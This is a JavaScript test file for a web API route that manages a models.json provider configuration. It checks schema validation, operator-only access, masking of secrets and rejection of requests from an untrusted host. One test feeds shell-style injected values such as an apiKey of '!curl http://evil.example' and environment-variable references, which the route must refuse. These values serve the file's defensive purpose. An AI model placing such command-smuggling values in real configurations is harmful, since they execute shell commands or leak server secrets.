import "../../../lib/yf/test-operator.mjs";
import assert from "node:assert/strict";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test, { after } from "node:test";
import { createJiti } from "jiti";

const originalAgentDir = process.env.PI_CODING_AGENT_DIR;
const testAgentDir = await mkdtemp(join(tmpdir(), "pi-web-models-config-route-"));
process.env.PI_CODING_AGENT_DIR = testAgentDir;

const jiti = createJiti(import.meta.url, {
  alias: { "@": process.cwd() },
  interopDefault: true,
  moduleCache: false,
});
const { GET, PUT } = await jiti.import("./route.ts");
const { writeSessionIndex } = await jiti.import("../../../lib/yf/session-index.ts");
const modelsPath = join(testAgentDir, "models.json");

after(async () => {
  if (originalAgentDir === undefined) delete process.env.PI_CODING_AGENT_DIR;
  else process.env.PI_CODING_AGENT_DIR = originalAgentDir;
  await rm(testAgentDir, { recursive: true, force: true });
});

// yingfang#31：GET 现在带 req（requireOperator 读 cookie）；test-operator 的
// 包装会给这个请求自动加上运营者 yf_session。
function get() {
  return GET(new Request("http://localhost/api/models-config", { headers: { host: "localhost" } }));
}

function put(body, headers = { "Content-Type": "application/json", Host: "localhost" }) {
  return new Request("http://localhost/api/models-config", {
    method: "PUT",
    headers,
    body: JSON.stringify(body),
  });
}

test("a models.json with a syntax error is reported instead of read as empty, and a save cannot replace it", async () => {
  const original = '{ "providers": { "acme": { "models": [ } } }';
  await writeFile(modelsPath, original);

  let response = await get();
  assert.equal(response.status, 422);
  assert.match((await response.json()).error, /models\.json/);

  response = await PUT(put({ providers: {} }));
  assert.equal(response.status, 409);
  assert.match((await response.json()).error, /models\.json/);
  assert.equal(await readFile(modelsPath, "utf8"), original);
});

test("a commented models.json loads with its providers", async () => {
  await writeFile(modelsPath, '{\n  // local models\n  "providers": { "acme": { "models": [{ "id": "a" },] } },\n}\n');

  const response = await get();
  assert.equal(response.status, 200);
  assert.deepEqual(await response.json(), { providers: { acme: { models: [{ id: "a" }] } } });
});

test("PUT refuses a non-JSON content type (audit S8)", async () => {
  const response = await PUT(put({ providers: {} }, { "Content-Type": "text/plain", Host: "localhost" }));
  assert.equal(response.status, 415);
});

test("PUT refuses payloads outside the models.json spine with the typed code (audit S8)", async () => {
  await writeFile(modelsPath, JSON.stringify({ providers: {} }));
  for (const body of [
    null,
    "string",
    { providers: "not-a-record" },
    { providers: [] },
    { providers: { acme: "not-a-record" } },
    { providers: { acme: { models: "not-an-array" } } },
    { providers: { acme: { models: ["not-a-record"] } } },
  ]) {
    const response = await PUT(put(body));
    assert.equal(response.status, 400, JSON.stringify(body));
    assert.deepEqual(await response.json(), { error: "invalidBody" }, JSON.stringify(body));
  }
  // nothing was written
  assert.deepEqual(JSON.parse(await readFile(modelsPath, "utf8")), { providers: {} });
});

test("PUT type-checks provider/model fields like the SDK's own loader (review r1: real schema)", async () => {
  await writeFile(modelsPath, JSON.stringify({ providers: {} }));
  for (const body of [
    // The review's demonstrated exfiltration of the old spine check.
    { providers: { acme: { baseUrl: 17, apiKey: 42, models: [{ id: 0 }] } } },
    // A payload without providers at all.
    { other: true },
    // Mistyped SDK-supported fields.
    { providers: { acme: { name: 7 } } },
    { providers: { acme: { authHeader: "yes" } } },
    { providers: { acme: { oauth: "not-radius" } } },
    { providers: { acme: { headers: { "x-a": 1 } } } },
    { providers: { acme: { models: [{ id: "m", reasoning: "yes" }] } } },
    { providers: { acme: { models: [{ id: "m", contextWindow: "big" }] } } },
    { providers: { acme: { models: [{ id: "m", input: ["video"] }] } } },
    { providers: { acme: { models: [{ id: "m", cost: { input: "free" } }] } } },
    { providers: { acme: { modelOverrides: { m: "nope" } } } },
    { providers: { acme: { modelOverrides: { m: { maxTokens: "lots" } } } } },
  ]) {
    const response = await PUT(put(body));
    assert.equal(response.status, 400, JSON.stringify(body));
    assert.deepEqual(await response.json(), { error: "invalidBody" }, JSON.stringify(body));
  }
  // An invalid payload never replaces the file on disk.
  assert.deepEqual(JSON.parse(await readFile(modelsPath, "utf8")), { providers: {} });
});

test("PUT accepts a provider shaped like the SDK's supported configuration (review r1)", async () => {
  const body = {
    providers: {
      acme: {
        name: "Acme",
        baseUrl: "https://acme.example/v1",
        // yingfang#31（plan A3）推翻基线裁定：保存面不再接受表达式写法的
        // apiKey/headers 值（会在服务端执行 shell / 读服务端环境变量）。
        apiKey: "sk-acme-literal",
        authHeader: true,
        headers: { "x-custom": "yes" },
        compat: { supportsStore: true },
        models: [{
          id: "m1",
          reasoning: false,
          contextWindow: 128000,
          maxTokens: 16384,
          cost: { input: 1 }, // partial cost: the write path completes rates with zero
          promptCache: { short: 300 },
          headers: { "x-model": "v" },
        }],
        modelOverrides: { m1: { name: "M One", headers: { "x-o": "v" } } },
      },
    },
  };
  const response = await PUT(put(body));
  assert.equal(response.status, 200, JSON.stringify(await response.json()));
  const written = JSON.parse(await readFile(modelsPath, "utf8"));
  assert.equal(written.providers.acme.name, "Acme");
  assert.equal(written.providers.acme.authHeader, true);
  assert.equal(written.providers.acme.apiKey, "sk-acme-literal");
  // Unknown keys survive, like the SDK's own loader.
  assert.equal(written.providers.acme.compat.supportsStore, true);
  // Cost normalization completed the missing rates with zero.
  assert.deepEqual(written.providers.acme.models[0].cost, {
    input: 1, output: 0, cacheRead: 0, cacheWrite: 0,
  });
});

test("PUT refuses a request from a host the proxy does not trust (audit S8)", async () => {
  await writeFile(modelsPath, JSON.stringify({ providers: {} }));
  const response = await PUT(new Request("http://evil.example/api/models-config", {
    method: "PUT",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ providers: { evil: { baseUrl: "https://evil.example" } } }),
  }));
  assert.equal(response.status, 403);
  assert.equal(await readFile(modelsPath, "utf8"), JSON.stringify({ providers: {} }));
});

// yingfang#31（spec R5/plan A6）：配置面仅运营者——伪造 cookie 401、普通用户 403。
const ORDINARY_USER_ID = "c".repeat(32);

test("the models-config face is operator-only: forged cookie 401, ordinary session 403", async () => {
  writeSessionIndex(process.env.YF_DATA_DIR, "tok-ordinary-models-config", {
    user_id: ORDINARY_USER_ID,
    expires_at: "2030-01-01T00:00:00Z",
  });
  assert.equal((await GET(new Request("http://localhost/api/models-config", {
    headers: { host: "localhost", cookie: "yf_session=forged-token" },
  }))).status, 401);
  assert.equal((await GET(new Request("http://localhost/api/models-config", {
    headers: { host: "localhost", cookie: "yf_session=tok-ordinary-models-config" },
  }))).status, 403);
  assert.equal((await PUT(put({ providers: {} }, {
    "Content-Type": "application/json",
    Host: "localhost",
    Cookie: "yf_session=tok-ordinary-models-config",
  }))).status, 403);
});

test("GET serves the masked view: no secret bytes, only 已配置 markers (yingfang#31 spec R4/plan A2)", async () => {
  await writeFile(modelsPath, JSON.stringify({
    providers: {
      acme: {
        baseUrl: "https://acme.example/v1",
        apiKey: "sk-very-secret",
        headers: { "x-keep": "header-secret" },
        models: [{ id: "m1", headers: { "x-model": "model-secret" } }],
      },
    },
  }));
  const response = await get();
  assert.equal(response.status, 200);
  const text = JSON.stringify(await response.json());
  for (const secret of ["sk-very-secret", "header-secret", "model-secret"]) {
    assert.ok(!text.includes(secret), secret);
  }
  const masked = JSON.parse(text).providers.acme;
  assert.equal(masked.key_configured, true);
  assert.deepEqual(masked.headers, { "x-keep": "" });
  assert.deepEqual(masked.headers_configured, { "x-keep": true });
  assert.equal(masked.models[0].headers["x-model"], "");
});

test("PUT refuses expression-shaped apiKey/headers values with a readable message (yingfang#31 spec R7/plan A3)", async () => {
  await writeFile(modelsPath, JSON.stringify({ providers: {} }));
  for (const body of [
    { providers: { acme: { apiKey: "!curl http://evil.example" } } },
    { providers: { acme: { apiKey: "$MY_SECRET" } } },
    { providers: { acme: { headers: { "x-a": "!echo hi" } } } },
    { providers: { acme: { models: [{ id: "m", headers: { "x-b": "$MY_SECRET" } }] } } },
  ]) {
    const response = await PUT(put(body));
    assert.equal(response.status, 400, JSON.stringify(body));
    const payload = await response.json();
    assert.match(payload.error, /字面量/, JSON.stringify(body));
  }
  // 被拒的保存不落盘。
  assert.deepEqual(JSON.parse(await readFile(modelsPath, "utf8")), { providers: {} });
});

test("PUT keeps stored secrets when the draft leaves their slots empty (yingfang#31 plan A2: 留空=保持原值)", async () => {
  const stored = {
    providers: {
      acme: {
        baseUrl: "https://acme.example/v1",
        apiKey: "stored-secret",
        headers: { "x-keep": "stored-header" },
        models: [{ id: "m1" }],
      },
    },
  };
  await writeFile(modelsPath, JSON.stringify(stored));
  // The panel round-trips the masked view: apiKey slot empty, header values empty.
  const masked = await (await get()).json();
  const response = await PUT(put(masked));
  assert.equal(response.status, 200);
  assert.deepEqual(JSON.parse(await readFile(modelsPath, "utf8")), stored);
});
